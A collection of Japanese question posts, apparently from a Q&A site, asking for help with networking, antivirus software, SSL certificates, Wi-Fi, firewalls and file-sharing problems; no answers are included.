ttp://cpanel.capnix.com こちらの海外サーバーを借りているのですが、たまにつながらない時があります。 www.mk.capnix.com/　こちらがサイトになります。 wwwを抜いてもアクセスできますが、wwwのサブドメインに各種設定をしているため正しく表示されないようです。（多分）　zen cart 考えられる原因はなにでしょか？ ちなみにFFFTPでアップロードもダウンロードもできます。 また、サイトトップにも問題なくアクセスできます。 ttp://capnix.com/ プロバイダはODNです。
またお世話になります。一昨日ウィルスバスター２０１２ダウンロード版を購入し（カードで決済済み）ダウンロードし開こうと操作を続けましたら、「Windows Service Pack2(SP2)が適用されていなければ動作不能とリマークが表示され、windows updateでＳＰ２を取り込もうとしましたら、それにはＳＰ１が適用 されていることが必要とアラートが出てきたのですが、ＳＰ１は すでに廃番となっており、適用のしようがありません。ＳＰ１が なくともＳＰ２をなんとか入手する方法はありませんか、お助けください。ウィルスバスター２０１２版売り込みメールには　ＳＰ２などのことは　全く触れられておらず難しいことはないのだろうと 安易にカード払いでの購入を申し込んでしまったのが誤りでは あるのですが、１３０００円強もドブに捨てるのは忍びないのです。よろしくお願いします。
自分のパソコンにウイルスセキュリティ０を入れていたのですが、しばらくパソコンを使わないでいるうちに、どうやら更新をしそびれたのか、英語の注意書きが表示され、ネットにつながらなくなりました。 ですが、その頃は特に必要に迫られていなかった為、放置する事一年以上… 最近久しぶりに使う予定があり、分からないなりに調べ、ひとまずネットは繋がるようになり、古いシリアルナンバーから、新しいナンバーを取得するまでには至りました。 アップデートして下さい、コンピューターが危険にさらされている場合が…という表示が出るため、アップデートしようにも、エントリーできません。 エントリーに失敗しました。インターネットに接続していません。との表示。 確かにネットに繋がっているんですが、それとはまた別の話なのか？ ウイルスセキュリティのヘルプを見てもその他ネットを見ても、知識の乏しい私にはこれ以上どうしようもありません。 説明も下手かと思いますが、どなたかご教授いただけたらと思います。 よろしくお願い致します。
ウェブルート・アンチウィルス・スパイスウィーパーを起動するのですが、ロードしていますの表示があり、その後一時間以上の時間がたってもそのままの状態が続きます。せっかく警告が表示され、詳細を確認してくださいの指示に従ってクリックしていますが、上記の状態です。何が悪いのか教えて下さい。
ＰＣを長い間、ワイアレスでつなげていたところ、ウイルスらしき物が入ってしまいました。 どのように除去したらよいですか?1分ごとに表記が出てきます。 「安全な接続ができませんでした」 clients3google.com433は不正なセキュリティ証明書を使用しています。 エラーコードsec_error_expired.certificate という表示です。 作上の方法を教えてください。
ドコモのXi（クロッシィ）Wi-Fiルーター　BF-01Dを使っていますが LINEの発信、着信ができません。これは仕様なんでしょうか？ それとも打開できる策はありますか？どなたかご存じの方いましたらアドバイスして いただけると助かります。 ちなみに発信、着信すると　接続中・・・とでてしばらくすると 「お電話を繋ぐことが出来ませんでした。もう一度お掛け直し下さい」 みたいなエラーメッセージができます。 ちなみに自宅の回線だと問題なく使えます。 ちなみに端末はipadです。自分で試してみたことはipadの再起動、最新バージョンアップデート LINEのアンインストール＆再インストール　最新バージョン確認　 やれる事はやってみましたがWi-Fiでの発信、着信ができません。トークはできます。 ご存じの方教えて下さい。お願い致します。m(＿ ＿；)m
バッファローのWHR-G301NAだけで ps３を（無線で）インターネットに接続することはできますか？ 無理だとしたら他に何が必要ですか？ インターネットを接続しているパソコンはあります。
あの、パソコンのパスワードがわからないのですが… ある理由で（親にパスワードを変えられた。）今使っているパソコンのパスワードがわからないのですが…確認する方法はあるのでしょうか。またはパソコンのデータを消さずにパスワードを変える方法は 無いのでしょうか？なるべく早くお願いします。
バックアップとraidで二重のガードをしているのですが 大切な音楽(レアな)やデジカメの写真が、特に不安です。 なのにも関わらず、PCゲームの誰が作ったかわからないtrainer?チート?の .exeファイルを何度も開いてしまいまして、ウイルス検知されてしまいました。 不安です。 よろしくおねがいします。
ある銀行のインターネットバンキングで証明書が発行されています。 現在使っている口座が同じ銀行で３つ存在します。 これら３つを仮にそれぞれA,B,Cとしておきます。 OSはWin7 IEは9です。 まず、Aの証明書を利用してインターネットバンキングにログインします。 仮にブラウザウィンドをA'としておきます。 次に新たなブラウザウィンドを開き、Bの証明書でログインをしようとするのですが もう証明書が選択された状態で、自動的にID及びPASSを入力する画面に飛ばされてしまいます。 本来はこの画面に飛ぶ前に、証明書の選択ウィンドウが出るはずなんですが・・・。 元々使用しているPCはXPでしたが、動かなくなってしまったため買い換えたPCです。 以前のXPでは、上記の「複数窓による複数口座への同時認証ログイン」が出来ていました。 OSもしくはIEブラウザのバージョンに起因するものなのでしょうか？ お分かりの方、ご教授のほどお願い致します。
Windows Server 2008 R2 Standardを使って、インターネット上にサイトを構築しました。 サイト全体にセキュリティを施す必要があり、SSL証明書を購入し運営ドメインに設置しました。 そのドメイン配下で特にセキュリティを高める必要がある場所があったので、仮想ディレクトリ作り、特定の者だけアクセスさせるようにしようとしているところです。 IP制限やVPNは使えないという条件で何か方法を探しており、クライアント証明書というものの存在を知りました。 クライアントのブラウザに証明書をインストールしているものだけアクセスできるので、できればこれを使いたいのですが、そもそも、その証明書はどこで取得できるのでしょうか？ 契約したSSL証明書の会社のホームページの製品にクライアント証明書について書かれていませんので、いろいろネットで調べましたが、知識不足の為いまいちよく分かりません。 今のサイトはドメイン認証タイプのSSLを設置してますが、そもそも、そのサイトの仮想ディレクトリに対してクライアント証明書での認証を行わせること自体可能なのでしょうか？
ノートン３年パソコン３台分を購入してます。（２０１１年版） ただし、我が家にはパソコンが１台しかありません。 ノートンのCDを使って、（勿論プロダクトキーは自分で利用しているものしかないが）残り２台分のインストール権利を、ヤフオクとかで販売できるのでしょうか？ たぶん、本来は違法なのでしょうが、そもそも、プロダクトキーが同じものは仮に売ったとしても、購入者は利用できないしくみになっているのでしょうか？
150Mbps 超小型無線LANアダプタ（LAN-W150N/U2シリーズ）を設置しましたが、クライアントモードでアクセスポイントが見つかりません。 OS：windows vista home Premium service pack 2 PC：dell Studio XPS 435MT WiFi: pocket WiFi ちなみに、iphoneとノートPCには、wifiが認識されています。 150Mbps 超小型無線LANアダプタ（LAN-W150N/U2シリーズ）をノートPCに接続した場合も APはちゃんと見つけておりまして、接続もできます。
ネットワークがどんな構築かを表すために、192.168.77.0/24のような表記方法をとりますが、0/24の意味ってなんなんですか？ 0と24はそれぞれ何を示してるんですか？
お世話になります 下記　ご教授ください。 事務所のネットワーク ルーター：YAMAHA　RT58i　 ネットワーク　192.168.100.0/24へ　 自宅からNetvolanteDNSを使ってPPTPにてリモート接続の設定をいたしました。 リモート接続を試みて　接続完了を確認。 事務所ネットワーク内のＮＡＳ（192.168.100.1/24）へのping→ok を確認しました。 ファイル名を指定して実行で　\\192.168.100.1\disk 　を実行すると接続できませんでした の表示が出て　共有フォルダへ入れません。（共有フォルダ名：disk） 又、ファイル名を指定して実行へ　http://192.168.100.1を実行すると　NASの設定画面が表示されます。 以上の結果より　事務所内ネットワークへは入る事ができていると推測いたしますが、 なぜ共有フォルダへアクセス出来ないかがわかりません。 自宅にはＰＣが2台有り（win7home、winXPPro）どちらからも同じ結果になります。 又、NASの型番は、プリンストンのPNS25というものです。 http://www.princeton.co.jp/product/nas/pns25mono … 情報で足りない部分もあるかと思います。 ご指摘いただければ都度追記いたします。 どなたか　アドバイス　お願いいたします。
Ipv4アドレスが枯渇して、今後グローバルアドレスの を配布するのが困難になった。みたいなニュースを 聞きました。今まで勉強サボってましたが。 ちょっとそろそろ知っとかないとまずいかな と思いまして。 Ipv6の情報を見てます ちょっとわからないことがありまして。 「FE80::/10」という表記があって。 この/10がピントこない。 というのは、 Ipv4の時(ipv4もあやふやかもです。)は、 ネットワークを表す部分のビット数を/の 後に書いてるんだなと、感覚的に覚えてました。 255.0.0.0/8 255.128.0.0/9 ネットワーク部のビット数を書いて。 残りの右側のビットがホスト部分。 ホスト部分を使って、 各ノードにアドレスを割り振る。 ただし、ホスト部がオールゼロは ネットワークそのもののアドレス。 ホスト部オールイチは ネットワーク内のブロードキャスト なので、その二つは各ノードに割り振れない。 サブネットマスクで、 ネットワークのアドレスを分割して。 使うようなものと。 スラッシュ記号は、そんな時に出てきた ネットワーク部が何ビットかを明確に するための記号だと記憶してました。 ここまで間違ってたら指摘してくださるとありがたいです。 それで、このイメージをもって以下のような 情報をみました。 いったい、これのどの部分が、どう /10なんでしょう。10の意味が、ちんぷんかんぷんであります。 見た情報は以下の通り、 リンクローカルアドレス 「FE80::/10」 開始: FE80:0000:0000:0000:0000:0000:0000:0000 終了: FE80:0000:0000:0000:FFFF:FFFF:FFFF:FFFF これを見て FE80を 1111 1110 1000 0000 に変えても、 1111 1110 1 は、9ビットだし。/10の10はいったいなんでしょう? FFFF:FFFF:FFFF:FFFF の部分を見ても10という数字は連想できない。 なにが10なんでしょう IPV6のスラッシュの後の数字はどういう意味でしょう。 教えてください。 以上です。
ポート開放には色々あってどれを開放したらいいのか未だに分かっておりません。 つまり、 ルーターのポート開放、Windowsのファイヤーウォール、パーソナルファイヤーウォールにもポート開放ががありますね。 Windowsのファイヤーウォールはパーソナルファイヤーウォールを設定すれば必要なしと言うことは分かるのですが、 ルーターのポート開放すればwindows,及びパーソナルファイヤーウォールの開放は必要ないということですか？あるいは両方必要なのかどうか？ ルーターを最近変えました。以前はポートが通っていました。それが未だに苦労してますが、 ポート21(FTP)がルーターも、パーソナルファイヤーウォールも開放してますがなかなかオープンになりません。ファイヤーウォール無効にもしてみました。 と言ってあるポート9000、3389(Windowsリーモートディスク)はオープンになるんです。 どれが本当のポート開放かわかりません。原因は何にあるのでしょうか？ ポート開放のブラウザ --------------------------------------------------------------- xxx.xxx.xxx.xxxの 21 番ポートに接続結果： 21 番ポートは開放されていません 改善案内 光回線の方でplalaさんご利用であればネットバリアーベーシックを解除してください XPやVISTA各種パソコンウイルス対策ツールのファイヤーウォールに問題はありませんか CATV回線の方はグローバルIP割り当て契約であるかを確認下さい 開放するパソコンやPSPプレイステーション3のIPアドレスが変動していませんか念の為ご確認下さい -------------------------------------------------------------------- 上記の結果です。どれも確認しました。
このttp://start.funmoods.com/?f=1&a=irontoの画面が最近トップ画面に表示されます。 内容は英文表示で何か怪しいと思い、他のヤフーを見ようとするとインターネットセキュリテイ画面が現れ、報告しないを選択しクリックするとブラウザが消えてしまう仕組みになっているようです。 いきなりブラウザが消えてしまうのは困るので色々対応して見ましたが消えません。 どなたか ttp://start.funmoods.com/?f=1&a=irontoを削除する方法はご存知ないですか？
今日のニュースに、アメリカとイスラエルが共同で、 コンピューターに侵入し、遠心分離機の回転速度を操って分離機を破損させるサイバー兵器を開発した。 とありましたが、非常に疑問があります。 (1)本当に遠心分離機の速度を変えることってできるとしたら、どうやってできたのでしょうか？ (2)また、どうやったら完全に攻撃を防ぐことができるのでしょうか？ サイバー攻撃ができるということは、遠心分離機はPCからの遠隔操作になっていて、 そのPCがインターネットにつながっていたのでしょうか？ F/Wとかはあるのかもしれませんが、 そんな重要なPCもインターネットに繋がってるもんなんでしょうか？ そんな重要な施設のPCがインターネットにつながっている事自体なんか変な気がしますが。 もしくは、誰かスパイみたいな人が施設に（バーチャルでなく実際に）侵入して PCにアクセスしてプログラムを更新したのでしょうか。 また、サイバー攻撃できないようにするには、以下何点か考えられると思いますが如何でしょうか？ ・プログラムを組み込みにして、モジュールを交換しないとプログラムを変更できないようにする。 ・PCではなく、アナログ操作にすればよい。 ・ネットワークをインターネットに繋げなければよい。 ・ワンタイムパスワードみたいなのでログインするように変更する。 ・バグが無い非常にシンプルなOS上でネットワークのセキュリティを高くする。
ハイスペックPCなのに、ずいぶん前からパソコンの動作が全部重いです。もちろん買ったばかりのときはサクサクでした。※1 サイトが完全表示される時間の場合、こんなにかかります。※2 【とあるサイト】　　　買ったばかりのころ3秒　ずいぶん前から15秒 【とある画像サイト】　買ったばかりのころ0秒　ずいぶん前から3秒　　　 政治的なヤバイ書き込みはしょっちゅうしているので、ハッキングされる可能性が高いです。リカバリしてIP変えたらサクサクになったのですが、(まだ政治的なヤバイ書き込みしてないのに)1日くらいで元に戻りました。たった1日で元に戻るので、やはりハッキングですよね。 対策が面倒なので伸ばし伸ばしにしてきました。この前プロバイダも変えてリカバリしてみたら、2週間たちますが軽いままです。 やはりハッキングですよね？ プロバ変えずに、リカバリしてIP変えたときは(IP変えたといっても、下3ケタしか変わりませんから)、ポートスキャンとやらで特定されたのでしょうか？※3 また、ルータとカスペルスキーを入れてるのですが、プロ相手には何入れても防ぎようがないのでしょうか？ よろしくお願いします。 ※1　CPUはcore i7、メモリは8GBです。重くなるようなことはしてないと思います。(レジストリのゴミ、常駐ソフトなど気をつけています) ※2　ネットの実効速度は、ずっと7M安定。 ※3　WindowsUpdateや定義ファイルはもちろん更新しています。フリーソフトも必要最小限。
質問させてください。 ダウンロードしたものを解凍したり、画像や音声ファイル、動画ファイルを再生した際にウィルスが仕込まれていたら感染すると思います。 では、YouTubeやflickrなどはアップロードされて再生、表示されても何故大丈夫(特にYouTube側とか)なのでしょうか？ アップ後すぐに表示されますし、裏で特にウィルス検索されてから表示されるという感じもしないのですが。 どのような対策が取られているのでしょうか？
今、社内でネットワークを組み複数のPCでファイル共有を行なっているのですが、windows7とXP間において、ファイルが共有できたり出来なかったりする時があります。 例えば、windows7内にある、Aフォルダを社内で共有している場合、windows7同士ではアクセスできるが、XPではアクセスが出来なかったり、アクセス出来ても途中で強制的にアクセスが切れたりすることがあります。 ちなみに、Aフォルダの入っているパソコン（windows7）で、管理ツールのサービスのserverを再起動すると、XPでもアクセスできるようになるのですが、頻繁に起こるので、何か解決方法はないでしょうか？ 以下に、環境を記載しておきますので、よろしくお願いします。 ■共有元のパソコンの環境 OS:windows7 Professional SP1 64ビット 接続のPC数：XP 4台 　　　　　　 VISTA 1台 　　　　 　　　 　7 4台 ※全て同じネットワーク名にしてあります。 以上、よろしくお願いします。
SSL通信を実現するために多くのサイトで認証局のデジタル証明書を使用しています。これを取得するためにはお金を払って認証局から証明書を発行してもらわなくてはならないようですが、認証局が発行する証明書はお金を払ってまで取得する価値はあるのですか？自己書名の証明書より大きい意義を見出せません。
更新が必要との表示が出たので更新したら、 緑の○の中にWが表示されてるものに変わりました。 今まで全部日本語だったのに英語表記に変わってしまいました。 問い合わせの番号を教えてください。探したのですが日本の電話番号の表記がいまいちよくわかりません。。
WINDOWS　ＶＩＳＴＡ　ＨＯＭＥ メモリ4ＧＢ ＨＤ　１ＴＢ ＨＤ3650の環境で上記のウイルスセキュリティ　ＺＥＲＯを使っています。 最近、アプリケーションの起動不能などが起こっていたので、ウイルスセキュリティ　ＺＥＲＯでスキャンしました。 すると拡張子 .K7v と言うファイルが問題のように表示されています。 Ｋ７ｖって言うのはウイルスセキュリティ　ＺＥＲＯの開発会社　Ｋ７コンピューティングのファイルだと思うのですが、知識がない為理解に苦しんでいます。 ちなみにトラブルの内容は ファイル名.k7v is a Trojan　（002e1e5b1) ファイル名.k7v is a Riskware (3dfd76070) などです。 ウイルスセキュリティ　ＺＥＲＯでウイルス検査した、K7（ウイルスセキュリティ　ＺＥＲＯ）のファイルがウイルスと判断されているようで、もうなんのこっちゃ？　って感じです。 ご存知の方よろしくお願いいたします。
ざっくりとした質問で申し訳ありませんが、遠隔地の拠点間でデータの共有を至急進めなくてはいけなくなり困っています。 素人なので詳しくは知らないのですが、、、、 クラウドやストレージ、VPNなど、さまざまなサービスがあるようなのですが、オススメの方法はありませんか？ ちなみに現状、5拠点間でネットワークを構築したいと考えております。 PCはMac OS10.7.3 イメージとしては、サーバー上のデータ（1つのデータが1M～300Mくらい）を拠点間で修正・更新して保存（100Gくらい）していきたいと考えています。基本的に顧客データの管理なので、セキュリティレベルが高い方が望ましいです。 なにぶん詳しいことがはっきりと決まっていないので質問に不備が多いと思いますが こんな素人を助けてあげようというお方のご提案お待ちしております。 宜しくお願い致します。
表題の件、 ご質問失礼致します。 現在、こちらの記事を元にホームページのログイン制限を作成しております。 http://allabout.co.jp/gm/gc/23780/ 何点か要領を得ない部分がございまして ご教示戴ける方がおられましたら幸いでございます。 １：.htaccess　ファイルを作るとファイル名が「.htccess .htaccess」となってしまいます。 　　「名前の変更」をして「.htaccess」と記入するとプロパティのファイル名も.htaccessになるのですが 　　こちらはこのままで宜しいのでしょうか？ 　　dreamweaverでアップロードする際にいつも「.htccess」というファイルは見たことがあっても 　　「.htccess .htaccess」というファイル名は見たことがないので疑問に思っております。 ２：.htpasswdファイルにつきましても「.htpasswd .txt」となっております。 　　「.htpasswd」というファイル名が通常かと思われ、 　　こちらも修正方法があればご教示戴ければ幸いでございます。 ３：(ID・パスワード格納ファイルの所在)のパスの記述なのですが 　　どのように確認すればよいでしょうか？ 　　 　　現在　ワードプレスにてホームページを作成しており、 　　サイト全体にアクセス制限をかける場合、 　　.htaccessと同じ階層に.htpasswdを設置すると思うのですが、 　　/www/wordpressの設置ファイル/ここに.htpasswdを置く 　　パスは上記で宜しいのでしょうか？ 　　「/www/wordpressの設置ファイル/.htpasswd .txt」 　　 上記　分かりづらい表現になっているかと思いますが ご教示戴ければ幸いでございます。
ＢＵＦＦＡＬＯの無線ランを使用していますが　スマホでWi-Fiの設定をしたいのですが パスワードを忘れてしまいました。なにか方法はありますか？
OSはWindows Vista Home Premium SP2を使用している、私の職場のPCですが、数週間前から、職場の有線LANネットワークにすぐにつながらなくなりました。 PCを起動すると、必ず2つのネットワークに同時につながった形となり、1つ目は見慣れた職場のネットワークですが、もう1つは不明なネットワークで、接続を一度無効にし、2つとも接続が切れてからもう一度ネットワークにつなげる修復をすると、１つのネットワークだけにつながり、あとはPCをシャットダウンして再び立ち上げるまでは正常にネットワーク環境が使用できます。 予防プログラムにマカフィーセキュリティーセンター11.0を使用しておりますが、うろ覚えではこれを更新した後でおかしくなったような記憶があります。でも定かではありません。 お忙しいところすみませんが、解決方法をご存知の方はお教えください。お待ちしております。
　こんにちは、LANとかについて勉強しているものです、宜しくお願いします。 　モデムの役割について教えて下さい。 モデムはデジタルのデーターをアナログに変換する（又はその逆）ためのものと聞きましたが、 電話線でもデジタルデーターの送信は可能なのにどうして、わざわざDA変換（AD変換）をし てやる必要があるのでしょうか。 友人に聞くと「データーを正確に遠くまで送信するため」と聞きましたが、よく理解出来ま せん。 　最初は、電話線では、デジタルデーターの送信は不可能だからと思っていましたが。 　どうも違うということが分かりました、宜しくお願い致します。
会社でネットワークを管理している者です。 proxy サーバーを設置しており、インターネットへアクセスする場合は proxyサーバーを経由する通信のみ許可するようにfirewall で制御しています。 社内パソコンには、 adobe reader や、java がインストールしているのですが、 自動で更新確認をするアプリケーションは、proxy サーバーを経由しないため、 更新確認ができなくて困っています。 皆様は、どのような対応をされているのでしょうか。
　上記の解凍ソフトをインストールしようとすると「現在のセキュリティレベルではインストールできません」と表示されます。そこでインターネットオプションでセキュリティレベルを最小に設定してみるのでせすが、結果は同じです。 　インストールの方法をお分かりのかた、おしえてください。
windows 7なのですが、パスワードを入力しても違うと表示されます。 いつもはIMEが出ているのに出ていない事、入力モードと変換モードが灰色になって機能していないように思うのですが、どうすればいいのかわからず途方に暮れています。 解決法を教えていただければ助かります。
３０人ほどの小さい会社なのですが、 最近、ルータの履歴を見ると、５０Mbpsを超える通信が頻繁に１０分、２０分と連続して発生しています。（ネットを使用していると時々酷く重くなったため調べてみて発見しました。） 通信機器は、YamahaのRTX1200をルータとして、その下にハブをいくつかぶら下げています。 （LAN1が社内向けのハブ、LAN２がWAN側。社内のPCはすべて同一ネットワークです。） 通信量が増えているのは、LAN1<->LAN2（外部との通信）であり、 何かセキュリティ上、非常にまずいことが起きてる気がするのですが、 その原因となっているPCが特定できないため、対処できないでいます。 IPアドレスは各PC個別に振っており、IPアドレスの特定が出来れば。。と思っています。 RTX１２００でのIPアドレスの特定方法や、その他対策などあれば、ご教授のほどよろしくお願いします。
こんにちは。 ある予約システムをレストランで使用しているものです。 この度そのシステムでインターネットからも客が予約を入れれるような機能を追加する予定です。 その際にGlobal IPが必要になると伝えられました。 WEBサーバがレストランの外にある為に必要だそうです。 あまりネットワークなどが詳しくないのでアドバイスをお願いしたく投稿しました。 安く利用できるグローバルIPを入手するにはどうすれば良いのでしょうか。 解る範囲でもアドバイスを頂けると非常に助かります。 宜しくお願い致します。
Snortを自動起動したいと思ってるのですが、エラーを吐いてしまいます centos5.8でsnortは2.9.2.2です インストール先は/usr/local/snortで/usr/loca/snort/bin/snort -vで起動しようとすると /usr/local/snort/bin/snort: erorr while loading shared libraries: libdnet.1: can not open shared object file: No such file or directory のエラーがでてしまいます /usr/local/libにlibdnet.1のファイルは存在して、/etc/ld.so.confファイルに/usr/local/libを記述、/sbin/ldconifgを実行して、再起動したのですが、同じエラーがでてしまいます export LD_LIBRARY_PATH=/usr/local/libを実行するとエラーはでなくなるのですが、ACIDを導入したいので、自動起動できるようにしたいです どなたかアドバイスおねがいします
GNS3でIOSの勉強をしております。 長くて申し訳ない質問ですが、どなたかお付き合い頂けたらありがたいです。 以下のトポロジで IPsec over PPPoE を自分なりにコンフィグしてみました。 　　　loopback　1.1.1.1 　　　│ R１　f0/0　　　　192.168.12.1 　　　│ R２　f0/0　　　　192.168.12.2 　　　│ 　　　loopback　　2.2.2.2 『pppoeやIPsecなどを使ってMTUを標準値以外に変えてしまう機器においては フラグメントを避けるべくMTUとMSSを必須で設定しておくべき』 との意見をWEBで見たのでやってみようと思っているのですが適性値を決めかねています。どなたかアドバイスいただけませんでしょうか？もしくは上記MTUやMSSを設定すること自体もはや過去の話だ、などといったご意見もありますでしょうか？ （実務経験全く無し、完全に我流でWEBをさまよいながら勉強しております。） これまでにやってみたことは以下です。 (1)WEBで見つけた似たようなサンプルではMTU=1454, MSS=1356と 　　設定していた。 　　→MSSの設定根拠が明記されていなかったので自分で検討して 　　　　みようと思った。 (2)R1において ping 1.1.1.1 source 192.168.12.1 df-bit size 1500　が 　　最大だった。 　　→IOSのpingオプションのsizeはICMPヘッダを含むんだなとわ 　　　　かった。 (3)R1において 　　ping 192.168.12.2 source 192.168.12.1 df-bit size 1492 　　が最大だった。 　　→PPPoEカプセリングで8バイト付与されるんだなとわかった。 　　　　別途、『ヘッダサイズはFletsでは46(MTU=1454)バイト、 　　　　その他の通常PPPoEでは8バイト』という記事を発見し安心。 (4)R1において 　　ping 2.2.2.2 source 1.1.1.1 df-bit size 1422 　　が最大だった。 　　→暗号化方式によってヘッダサイズは変わるであろう。 　　　　ミリミリ計算はしていないが実際に1422しか通らないん 　　　　だからIPsecヘッダは 1492 - 1422 = 70バイトついて 　　　　いるんだろう。 　　→MTU=1422と設定すれば良いのかな？ (5)オプションなしTCPヘッダ＝２０バイト、オプションなしIPヘッ 　　ダ＝２０バイト、計４０バイトを引いてMSSを決めるセオリー 　　に従うと　MSS＝１３８２バイト　で良いのかな？ 　　→前出のWEBで見つけたサンプルでは 　　　　MTU（1454） － MSS（1356） ＝ ９８バイトも 　　　　マージンを取っているが何故だろう？ どなたか宜しくお願い致します。
どうぞよろしくお願いいたします。 先日パソコンが壊れ、ようやく本日購入しました。 元のパソコンはVISTAで今回はセブンです。 そこで、前のHDは壊れていないようなので、ある程度移動したのですが、 どうにもIDセーフのログインの情報というか、IDとPASSがどこにあるのかが 全く解らない状態で、インポートの仕方も見たのですが場所が解らない為に困っています。 同じ経験を克服された方、またご存知の方、お助けくださいませんか？？？ 今は試用版ですが以前のデータはインポートできるようです。 どうぞよろしくお願いいたします。
今年に入ってからウイルスバスターからカスペルスキーに変えました。 カスペルスキーの「詳細レポート」を開くと「ウェブアンチウイルス」という項目があります。 これは削除できないんでしょうか？ ご存知の方回答よろしくお願いします。
教えてください。 SSL証明書が外部の認証機関から発行され、サーバに設定したのですが 自社サーバから外（WAN）に対してポート番号443を開ける必要がありますでしょうか？ 宜しくお願いします。
PCを更新しました。古いほうからメルアドを取り上げて新しいほうに設定しました。 古いほうには正規のofficeがインストールされています。新しいほうも勿論プリインストールされています。古いほうはメルドがないためオンラインでは使用しませんが、windowsやウイルスセキュリティの更新は当然できません。問題は古いほうのoffice2007ですが、このまま使用することができますか。
ある日パソコンをつけてページを開くと見たいページがｉフィルターのせいで見られなくなって いました。親に聞くと、ｉフィルターをかけた覚えがないとしかいってくれません。 なのでパソコンで調べて、使っているコンピューターの中にｉフィルターのソフトが入っていないか、 探してみたのですが見つかりませんでした。 たぶんプロキシサーバーという中継地点を通してそこでブロックしてると思います。 もし解除ができなかったら回避の方法を教えてください。お願いします ちなみにルータ？はバッファローで　PCはWindows　ｘｐで　iフィルター6.0です
ゲーム中に5分経つと「Security Alert」と表示が出て強制終了されてしまいます。 昨日まではこのようなことにはなっていません。 調べてみたのですが有料のソフトで除去するしかないのでしょうか。 また、これを放っておくとオンラインゲーム以外に支障は出るでしょうか。 ウイルスソフトはAvastを使っています。
Juniper/SSG5(6.1.0r2.0)のDMZの設定について教えて頂きたい。 Eth0/0(Untrust)は、プロバイダからPPOE経由で、固定IP[8IP]を取得しております。 Eth0/1(DMZ Zone)に、固定IPを使用したサーバ複数台を接続設置しようとしています。 SSG5のネットワークの設定： Untrust側：固定IP[8IP]の1番目 DMZ側 ：固定IP[8IP]の2番目 サーバ：固定IP[8IP]の3番目 としました。 固定IPが[8IP]なので、DMZのサブネットマスクを[29]とするとエラーとなり設定を行なうことが出来ません。 DMZのサブネットマスクを[32]とすると設定はできますので DMZのサブネットマスクがUntrustのアドレス範囲となると、設定ができない状況です。 設定漏れ等が考えられます。ご教授をお願いします。
表題の件について、ご教示頂けたらと思います。 現在、社内ポータルの構築を検討中です。 経費削減のため業者には頼まず、なんとか社内の人員のみで構築・管理したいと考えているのですが、 ネットワークに関する知識が浅く、情報の検索にも手間取っている状態です。 現在の状況、および目的については下記のとおりです。 1.会社のホームページ有り（自社サーバー） 2.ただし、PHP,MySQLは未インストール 3.WordPressもしくは、CMSを導入予定 4.社外秘の情報も管理予定のため、社外からのアクセスを禁止したい （ポータルへのアクセスをパスワード制限するのではなく、社外から社内ネットワークへアクセスすることを禁止したい） 5.現在、社内で管理しているPC１台ずつにIPを振り分けている ２，３については、こちらで調べてなんとかなりそうですが、 ４については、どのような方法が考えられますでしょうか？ 先にも述べましたが、知識が浅いため的外れな質問をしているかもしれませんが、 考えられる方法、もしくは参考になるURLやキーワードを教えて頂けると幸いです。 よろしくお願い致します。
会社のある区画Aに設置したサーバー(1)に対して、 区画AのPCから pingを打ち込んだらreplyするのですが、 別の区画Bからpingを打ち込むとreplyしません。 別のサーバー(2)については、PCから打ったpingはAからもBからもreplyするので、 B-A間の断線ではないようです。 区画Aは123.12.123.0/24 区画Bは123.12.122.0/24 となっています。サーバー(1)はCentOSで、固定IPを割り振っています。 区画A、区画Bともに名前解決は問題なくできています。 どのような原因が考えられますでしょうか。 目的は区画Bからサーバー(1)にSSH接続して利用することです。 もう一度構成を書いておきます。 　　PCあ　　　サーバー(1)　　サーバー(2) ──┴──┬─┴─────┴───────123.12.123.0/24（区画A） 　　　　　　　 │ 　　　　　　　 │　　　　　　　 　　　　　　　 │　　　PCい ─────┴───┴───────────123.12.122.0/24（区画B) 「PCあ」からping⇒サーバーA、サーバーBからリプライ 「PCい」からping⇒サーバーBのみからリプライ サーバー(1)はCentOS。ファイアウォール全開。固定IP設置。ほかはほとんどデフォルト。 情報が不足している場合、指摘をいただけると助かります。
ＫＤＤＩでWi-Fiテザリングをして、デスクトップＰＣをつなげたあと、 ＩＰアドレスを頻繁に変更したいのですが、携帯の電源を切ってから 何分ぐらいＫＤＤＩの電源をきればＩＰアドレスは変更になるのでしょうか？ コマンドプロントを見るとLease Obtainedと「Lease Expiresでわかったのですが、 9時間ぐらいIP持つようなので、もっと頻繁にIPアドレスを変更したいのですが、どうすれば？？？ アドバイス　助けてください 下記説明をみると、常時、プライベートIPアドレスみたいです http://k-tai.impress.co.jp/docs/news/20110719_46 … http://www.au.kddi.com/manual/hti11/misc/misc07. …
オンラインのゲームをダウンロードしようとすると「ActiveXのインストールが必要です」と言われたのでActiveXをダウンロードすると -------------------------------- インストールの完了 DirectXセットアップによって、新しいバージョンまたは同等バージョンの DirectXが既にインストールされていると判断されました。インストールの必 要はありません。 -------------------------------- と返答が返ってきます 何度しても結果は同じです。 もちろんオンラインのゲームの返事は一番上と同じ答えが返ってきます どうすれば解決できますか？ ご回答お待ちしています。
クライアントからFTPでサーバにアクセスしようと思ってます。 サーバはWindows server 2008 R2です。 サーバ機のコマンドプロンプトで「netstat -a」を打っても、21がlistenしていないので、ファイアウォールの問題と思い、下記のページで示されている２つの方法を参考に設定しましたが、有効になりません。 他に何か原因が考えられるでしょうか。 ネットワーク初心者です。ご教示よろしくお願いいたします。
PC_VN770FS6Ｗ Intel(R)My WiFiテクノロジー ネットワークアダプターが見つかりません。 どう対応したらいいんですか？
以前は、楽天で検索すると、本日の山分けポイント：1,250,000 　14/30口　等と右端に表示されていましたが今は検索しても表示されません。どすれば表示できますか？
パソコンがルーターからルーティングテーブルを取得するプロセスがわかりません。 ・ルータとパソコンを繋いだ時に自動的に作成される？ ・何かしらの通信を行いルーティングテーブルを取得している？ ・そもそもパソコンはルーティングテーブルを取得しない？ 解答お待ちしています。
ＷＩＮＤＯＷＳ７　６４ビット版で、ＷＩＮＤＯＷＳファイアウォール有効設定でネットワークを見ると自分だけのＰＣアイコンしか出ませんが、それを無効にすると他のパソコンのアイコンが現れ、クリックすると共有フォルダにアクセスできるようになります。それを有効にしても他のパソコンが見られます。しかし、再起動するとまた他のパソコンが見えなくなります。常時、他のパソコンにアクセスできるようにするために、ＷＩＮＤＯＷＳファイアウォールの設定をしたいのですが、、、。このネットワーク上にはＸＰ、ＶＩＳＴＡとＷＩＮＤＯＷＳ７　３２ビット版ＰＣが混在していますが、常時他のＰＣにアクセスできています。 よろしく、お願いします。
